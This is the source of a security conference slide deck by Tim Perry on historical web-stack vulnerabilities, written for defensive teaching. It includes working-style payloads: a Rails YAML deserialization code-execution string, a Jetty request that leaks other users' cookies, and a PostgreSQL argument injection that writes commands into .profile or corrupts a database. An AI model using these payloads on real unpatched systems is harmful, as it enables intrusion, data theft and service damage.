doctype html
html
  head
    meta(charset='utf-8')
    meta(name='viewport', content='width=device-width, initial-scale=1, maximum-scale=1')
    title Your Web Stack Would Betray You In An Instant

    // build:css styles/styles.css
    //- Check out 'src/bower_components/prism/themes/' for available themes
    link(rel='stylesheet', type='text/css', href='bower_components/prism/themes/prism-tomorrow.css')
    link(rel='stylesheet', type='text/css', href='styles/defaults.css')
    link(rel='stylesheet', type='text/css', href='styles/main.css')
    // endbuild

  body

    article

      section(data-bespoke-state='topic-slide')
        h1.title Your Web Stack Would Betray You In An Instant
        address.vcard
          div.author.fn Tim Perry
          div.urls
            span 
              a.nickname.url(href='http://twitter.com/pimterry',rel="me") @pimterry
          div.note.bio
            span Tech Lead &amp; Open-Source Champion at&nbsp;
            span.org.vcard
              a.org.fn.url(href='http://softwire.com',rel="group") Softw<span class="i">i</span>re

      section
        img(src='images/softwireLogo.png',class='logo-big',alt='Softwire')
        aside
          ul
            li Bespoke software development company
            li in London
            li We're recruiting!
            li Interesting problems, great atmosphere, huge variety of different tools and projects

      section
        h2.full-slide Security
        aside
          ul
            li When I say security, I mean handling nasty people on the internet trying to mess with your web app
            li Often assumed you're not worth attacking
            li Opportunistic attackers, looking for easy security holes
            li Platform for virus and malware distribution, phishing, for further attacks elsewhere.
            li We're going to look at some examples

      section
        h2 Your Web Application:

        ul.stack
          li Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Infrastructure

        aside
          ul
            li This is you
            li Walk through each
            li Broad concepts
            li Bit of a spoiler

      section
        h2 Everything is insecure
        
        aside
          ul
            li Whole point of the talk
            li Security is hard
            li You're not going to do it perfectly
            li Inevitable failure means that it's more about minimizing risk + potential damage
            li Upside to this

      section
        h2 Things that will be loudly publically insecure:

        ul.stack
          li.lowlight Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Infrastructure        

        aside
          ul
            li If your code is insecure, nobody cares
            li There's probably very few people looking

            li Lots of value in holes in common components
            li This talk is not about your code, about shared code you're using

            li I want to talk about some of these, how they work
            li because I enjoy taunting software devs
            li also what you can do to avoid this
            li Before we do that though

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Be Ready  
          | To Update
        aside
          ul
            li Number one point in this whole talk
            li Obvious conclusion: if everything will break, you have to be ready to recover
            li Most projects announce vulnerabilities as soon as they have a release to fix them
            li All you really have to do is react faster than the other team
            li If you do nothing else: subscribe to notifications
            li Make sure you're in a good position to do something about them

      section(data-bespoke-state='topic-slide')
        h2.full-slide Ruby on Rails

        ul.stack.corner
          li.lowlight Your Code
          li Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure

        aside
          ul
            li Start with rails
            li Popular web framework
            li Easy to quickly build applications
            li Automatically handles lot of complexity for you
            li On top of Ruby the language

      section
        h2 YAML

        ul.bullets.in-place-transition
          li
            pre
              code.language-yaml.
                ---
                name: "Tim Perry"
                company: "Softwire"
                speaking: Yes
                ears:
                 - "Left"
                 - "Right"
          li
            pre
              code.language-yaml.
                --- !ruby/hash:User
                name: "Tim Perry"
                company: "Softwire"
                speaking: Yes
                ears:
                 - "Left"
                 - "Right"
        aside
          ul
            li Very popular in the Ruby world
            li Config, serialization
            li *Mostly compatible* with JSON
            li *Optional braces*
            li Supports lots of extra complexity
            li One thing it supports is types
            li User, as a hash/dict/map
            li Default Ruby YAML parser will build a User when this is parsed
            li Dangerous if building, say, database connections, just by parsing

      section
        h2 YAML
        pre
          code.language-ruby.
            user = User.allocate
            values.each_pair { |key,val|
                user[key] = val
            }
        aside
          ul
            li Allocate is not constructor
            li Set key-values for each prop, name/company etc
            li Weird: parsing process actively involved in your code
            li Not just weird: because you can override property setting
            li Key, Value and class are user controlled 
            li Dangerous: if key/value's ever used for anything...

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            alias []= add

            def add(name, route)
              ...
              @module.module_eval(
                "remove_possible_method :\#{name}; ..."
              )
              ...
            end
        aside
          ul
            li Builtin Rails class, part of routing
            li Overrides property setting operation
            li \#{name} is string replacement syntax in Ruby
            li Classic eval-injection attack

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            name = "ignored; puts 'Hello'; \n__END__\n"            

            @module.module_eval(
              "remove_possible_method :\#{name}; ..."
            )

            # Becomes:

            @module.module_eval(
              "remove_possible_method :ignored; puts 'Hello'; 
               __END__
               ..."
            )
        aside
          ul 
            li This runs 'puts hello'
            li puts = print
            li Works because __END__ exists
            li Terminates a chunk of code prematurely
            
      section
        h2 Arbitrary Code Execution with YAML
        pre
          code.language-yaml.
            --- !ruby/hash:NamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n": 
                !ruby/object:OpenStruct 
                  ‘table’: {‘defaults’: {}}
        p (Namespaces omitted)
        aside
          ul
            li YAML equivelant
            li Need openstruct for validation
            li If Rails parses this, you win
            li But somehow you need to get Rails to parse this
            li Early last year, that got really easy

      section
        h2 Rails
        h4 CVE-2013-0156
        pre
          code.language-yaml.
            &lt;?xml version="1.0"?&gt;
            &lt;foo type='yaml'&gt;
              --- !ruby/hash:NamedRouteCollection
              "ignored; puts 'Hello'; \n__END__\n":
                  !ruby/object:OpenStruct
                    'table': {'defaults': {}}
            &lt;/foo&gt;
        aside
          ul
            li Rails has a lot of convenient features
            li Default: Endpoints can take data in JSON or XML
            li XML elements can be typed, as here
            li YAML is a valid type, for some ungodly reason
      section
        h2 Rails
        h4 CVE-2013-0333
        pre
          code.language-yaml.
            Content-Type: application/json

            --- !ruby/hash\u003aNamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n":
                !ruby/object\u003aOpenStruct
                  'table': {'defaults': {}}
        aside
          ul
            li Two weeks later, another one
            li Default JSON parser is really just YAML
            li Intended to use YAML internally
            li But actually doesn't parse JSON and restructure
            li Couple of search and replaces and hopes for the best
            li No consideration of security at all
            li Replaces date strings with YAML date literals for convenience            
            li Adds a space after colons, because that's required in YAML
            li Then does unicode replacement too, afterwards

      section
        h2 Rails
        h4 CVE-2013-0277
        pre
          code.language-ruby.
            class BlogPost &lt; ActiveRecord::Base
              :serialize tags
            end
    
      section
        h2.full-slide Ouch

        aside
          ul
            li Pretty painful for Rails developers
            li 3 times in two months
            li Repeated nights of no sleep redeploying everything before they got hacked
            li All that work was not for nothing though
            li I for example got a great example out of it
            li And you get some useful lessons

      section(data-bespoke-state='solution-slide')
        h2.full-slide Fear User Input
        h3 (in any format)
        aside
          ul
            li Limit what input you accept
            li Tools will may assume their input is safe
            li Powerful formats: both YAML and XML, but JSON mostly safe

      section(data-bespoke-state='topic-slide')
        h2.full-slide PHP 

        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure

      section
        h2 PHP
        pre
          code.language-php.
            $user = new User();
            $user-&gt;username = $_POST['username'];

            $hashedPassword = crypt($_POST['password'], $salt);
            $user-&gt;password = $hashedPassword;

            $user-&gt;save();
        p (Salt generation and all validation omitted)
        aside
          ul
            li Validation!
            li Salt is unique per user
            li But same salt for every login

      section
        h2 PHP
        pre
          code.language-php.
            $salt = $user-&gt;password;
            $hashedPasswordInput = crypt($_POST['password'], $salt);

            $loginOk = ($user-&gt;password === $hashedPasswordInput);
        aside
          ul
            li Convenient feature though: salt is included in password
            li This is the recommended way of handling this
            li Separated by a $
      section
        h2 PHP 5.3.7
        pre(style='font-size: 24px')
          code.language-c.

          span(style='color: #f77')
            code.language-c.
            | - strncat(passwd, "$", 1);

          br
          span(style='color: #7f7')
            code.language-c.
            | + strlcat(passwd, "$", 1);
        aside
          ul
            li Well meaning fix to solve build warning
            li Strncat is considered insecure because it might overflow first arg
            li Strlcat doesn't do this, so is better
            li Unfortunately, doesn't do this because of the last arg
            li Fixed another important security issue
            li Recommended for immediate update for 5 days

      section
        h2 Strings
        ul.bullets.in-place-transition
          li
            img(src='images/modern-string.png',
                style='width: 560px; margin: 30px 0 0 -35px')
          li
            img(src='images/modern-string-details.png',
                style='width: 560px; margin: 30px 0 0 -35px')
          li
            img(src='images/c-string.png',
                style='width: 560px; margin: 30px 0 0 -35px')

      section
        h2 PHP 5.3.7
        pre(style='font-size: 24px')
          code.language-c.

          span(style='color: #f77')
            code.language-c.
            | - strncat(passwd, "$", 1);

          br
          span(style='color: #7f7')
            code.language-c.
            | + strlcat(passwd, "$", 1);

      section
        h2 String concatenation
        ul.bullets.in-place-transition
          li
            pre(style='font-size: 200%;')
              code.language-c.
                strncat(passwd, "$", 1)
            img(src='images/strncat.svg',
                style='width: 500px; height: 98px; margin: 30px')

          li
            pre(style='font-size: 200%;')
              code.language-c.
                strlcat(passwd, "$", 1)

            img(src='images/strlcat.svg',
                style='width: 500px; height: 98px; margin: 30px')

      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            crypt($password, $salt) === $salt
      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        ul.bullets.in-place-transition
          li
            pre
              code.language-php.
                $salt = $user-&gt;password;
                $hashedPasswordInput = crypt($_POST['password'], $salt);

                $loginOk = ($user-&gt;password === $hashedPasswordInput);
          li
            pre
              code.language-php.
                $salt = $user-&gt;password;
                $hashedPasswordInput = $salt;

                $loginOk = ($user-&gt;password === $hashedPasswordInput);
          li
            pre
              code.language-php.
                $loginOk = ($user-&gt;password === $user-&gt;password);
      section
        h2 Tests?
      section
        h2 Reported?

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Value
          br 
          | Best
          br
          | Practices

      section(data-bespoke-state='topic-slide')
        h2.full-slide Jetty
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure
        aside
          ul
            li We're all using a web server, Apache, Tomcat, Jetty, IIS
            li Jetty particularly is growing rapidly in the modern Java community            
            li Like Nancy in the C# world

      section
        h2 HTTP
        pre
          code.language-bash.
            GET / HTTP/1.1
            Host: localhost:8080
            Accept: text/html
            Cookie: password=secret

        aside
          ul
            li This is a simple HTTP request Jetty might receive
            li Has a series of headers with keys and values
            li Some of which contain secrets, typically the cookies particularly
            li Potentially also the request body too though, containing valuables

      section
        h2 Bad HTTP
        pre
          code.language-bash.
            GET / HTTP/1.1
            Host: localhost:8080
            Accept&#174;: text/html

        aside
          ul
            li This is an invalid HTTP request
            li &169; is binary 169, and that's not a legal character in an HTTP header name
            li Jetty follows the RFCs for this and (like most web servers) rejects this request.

      section
        h2 Bad HTTP
        pre
          code.language-bash.
            HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
               'GET / HTTP/1.1
                H...t:8080
                Accept\xC2<<<\xAe: text/html

                >>>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
                \x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00
                \x00\x00\x00\x00\x00\x00\x00\x00'
            Content-Length: 0
            Connection: close
            Server: Jetty(9.2.8.v20150217)
        aside
          ul
            li In that case, with the version of Jetty released in February, we get a response like this.
            li Error message containing the request content and highlighting the bad character
            li There's an issue with this though
            li What're those zeros?
            li They're the rest of the contents of the buffer
            li This is printed by a general purpose 'toDebugString(buffer)' method
            li Prints the content in a buffer, highlighting a part, and providing context
            li This sounds fine, just messy, but is actually a huge disaster: these buffers are reused by all requests
            li If the previous request was longer than this one, we can read a chunk of data out of it
            li Can change which data by progressively increasing how far down our request the bad character comes



      section
        h2 CVE-2015-2080
        ul.bullets.in-place-transition
          li
            div.sideBySide
              pre(style='align-self: flex-start;')
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept: text/html
                  Cookie: password=secret
              pre
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept®: text/html


                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
                   'GET / HTTP/1.1
                    H...t:8080
                    Accept\xC2<<<\xAe: text/html

                    >>>ie: password=secr...\x00\x00\x00\x00\x00
                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                  Content-Length: 0
                  Connection: close
                  Server: Jetty(9.2.8.v20150217)



          li
            div.sideBySide
              pre(style='align-self: flex-start;')
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept: text/html
                  Cookie: password=secret
              pre
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept®: text/htmlQQQQ


                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
                   'GET / HTTP/1.1
                    H...t:8080
                    Accept\xC2<<<\xAe: text/htmlQQQQ

                    >>>password=secret

                    ...\x00\x00\x00\x00\x00
                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                  Content-Length: 0
                  Connection: close
                  Server: Jetty(9.2.8.v20150217)
        aside
          ul
            li We can use this to see bits of other people's requests          
            li And with minor fiddling, we can find the relevant bit of request we're looking for

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Keep
          br
          | Errors
          br
          | Secret

      section(data-bespoke-state='topic-slide')
        h2.full-slide PostgreSQL
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li Database
          li.lowlight Network Infrastructure
      
      section
        h2 Postgres
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="blogdb"
        aside
          ul
            li Postgres client
            li Most absurd bug of the lot
            li DB name with a dash, it's not a DB name, but command line arg, on the server.
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/data/db"
        aside
          ul
            li This writes the command output to this file, corrupting the DB
            li This happens before auth
            li Actually even before connection filtering
            li Crash any connectable Postgres instance
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            no pg_hba.conf entry for host "example.com", 
              user "postgres", database "-r/var/lib/postgres/data/db"
        aside
          ul
            li Log out put looks like this
            li username is notably under our control
            li Find somewhere executable to put this
            li Classic injection attack
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/.profile" \
                 --username="
                 echo 'Hello' #"
        aside
          ul
            li .Profile is a favourite for this, since it's very liberal about what it'll run
            li it'll ignore our garbage, just need a line that's usefully executable
            li it's run whenever a user logs in, here the postgres user
            li Here newline, then our command, then a comment to clear the rest
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            $ cat .profile
            [...]
            no pg_hba.conf entry for host "example.com", user "
            echo 'Hello' #", database "-r/var/lib/postgres/.profile"

        pre
          code.language-bash.
            $ su - postgres
            no: command not found
            Hello
        aside

      section
        h2 So?
        aside
          ul
            li 1.4 million connectable postgres's, as of this morning
            li Sometimes for convenience, relying on postgres' own security
            li Sometimes for distributed infrastructure
            li All in hilarious danger
          
      section(data-bespoke-state='solution-slide')
        h2.fullish-slide Isolate Your Infrastructure
        h3 (From itself, and everyone else)
        aside
          ul
            li Isolation is important
            li Isolate your tools from the world, to reduce attack surface
            li Combine their security, so both must fail
            li Isolate your components from one another 
            li Otherwise you're combining their risks: failure if either fails
            li Don't rely on one single point of failure for security

      section(data-bespoke-state='topic-slide')
        h4 Nothing is really secure, but
        h2.full-slide Don't Panic
        ul.conclusions
          li Be ready to update
          li Fear user input
          li Value Best Practices
          li Keep Errors Secret
          li Isolate your infrastructure
        aside
          ul
            li If nothing else, watch for security notices, be ready to update <em>fast</em>
            li Be very cautious around user input. Lots of risk that's easily missed.
            li Pay attention to software development best practices, especially testing etc
            li Consider the real cost of features. Turn off or limit unnecessary features where possible
            li Isolate your components from one another, and the world

      section(data-bespoke-state='topic-slide') 
        h2 OpenSSL
        h4 Heartbleed (CVE-2014-0160)

        img(src='/images/heartbleed.svg',height=350)

        aside
          ul
            li You've heard lots about this already, I'm sure, so I'll be brief
            li Heartbleed notably hits every box I've talked about
            li The core bug is a failure to validate <strong>user input</strong>
            li The OpenSSL code and management has some major problems
            li Writing their own malloc: definitely not <strong>best practice</strong>
            li Heartbeat <strong>feature</strong> itself isn't actually that useful to most people
            li <strong>Isolation</strong> could definitely limit the damage
            li Terminate your SSL elsewhere allowed you to isolate at least some of your risk
            li Could lose SSL certs, but no server-side only data (API keys, DB access, admin logins)

      section
        h2 OpenSSL      
        h4 Heartbleed (CVE-2014-0160)
        pre
          code.language-c.
            buffer = OPENSSL_malloc(1 + 2 + payload + padding);
            bp = buffer;

            *bp++ = TLS1_HB_RESPONSE;
            s2n(payload, bp);
            memcpy(bp, pl, payload);
        aside

      section(data-bespoke-state='topic-slide') 
        h2 The also-rans:

        ul
          li <span class='highlight'>Node.JS</span>: Cross-request header stealing <br/>(CVE-2012-2330)
          li <span class='highlight'>Python</span>: Remote code execution via builtin socket receive function <br/>(CVE-2014-1912)
          li <span class='highlight'>GCC</span>: Optimizations remove checks required to avoid overflow exploits<br/>(CVE-2009-1897)
          li <span class='highlight'>WebSockets</span>: Security bug in initial spec, when used with caching proxies
          li <span class='highlight'>SSL/TLS</span>: BEAST/CRIME/BREACH attacks against SSL and TLS<br/>(CVE-2011-3389, CVE-2012-4929, CVE-2013-3587)
          li <span class='highlight'>MongoDB</span>: Overflow exploits, crashing servers with a single request <br/>(CVE-2012-6619, CVE-2013-2132)
          li <span class='highlight'>RubyGems</span>: YAML exploit gave an external user full access to the repo
          li <span class='highlight'>NPM</span>: Full disk exposure on NPM server with a maliciously crafted URL

      section(data-bespoke-state='topic-slide') 
        h2.full-slide(style='text-align: left')
          | Any questions?
        br

        address.vcard
          div.author.fn Tim Perry
          div.urls
            span 
              a.nickname.url(href='http://twitter.com/pimterry',rel="me") @pimterry
          div.note.bio
            span Tech Lead &amp; Open-Source Champion at&nbsp;
            span.org.vcard
              a.org.fn.url(href='http://softwire.com',rel="group") Softw<span class="i">i</span>re
        aside
          ul
            li We're recruiting!
            li Follow me on twitter for slides
            li C# stack: Windows!
            li DOS via a specific IPv6 packet
            li XMLDOM ActiveX control in every windows up to 8.1 is vulnerable to bil laughs
            li Mostly fairly stable otherwise, main attacks tend to be ActiveX component leftovers
            li Java: 35 remotely exploitable vulns fixed this month's Java SE release
            li 4 exploits rated 10/10, but no details, includes many in JAX-WS etc
        

    // build:js scripts/scripts.js
    script(src='bower_components/bespoke.js/dist/bespoke.js')
    script(src='bower_components/bespoke-keys/dist/bespoke-keys.min.js')
    script(src='bower_components/bespoke-touch/dist/bespoke-touch.min.js')
    script(src='bower_components/bespoke-scale/dist/bespoke-scale.min.js')
    script(src='bower_components/bespoke-hash/dist/bespoke-hash.min.js')
    script(src='bower_components/bespoke-state/dist/bespoke-state.min.js')
    script(src='bower_components/bespoke-convenient/dist/bespoke-convenient.js')
    script(src='bower_components/bespoke-indexfinger/dist/bespoke-indexfinger.js')
    script(src='bower_components/bespoke-secondary/dist/bespoke-secondary.js')
    script(src='scripts/bespoke-bullets.js')
    script(src='bower_components/prism/prism.js')
    script(src='bower_components/prism/components/prism-ruby.js')
    script(src='bower_components/prism/components/prism-php.js')
    script(src='bower_components/prism/components/prism-c.js')
    script(src='bower_components/prism/components/prism-bash.js')
    script(src='scripts/prism-yaml.js')
    script(src='scripts/main.js')
    // endbuild
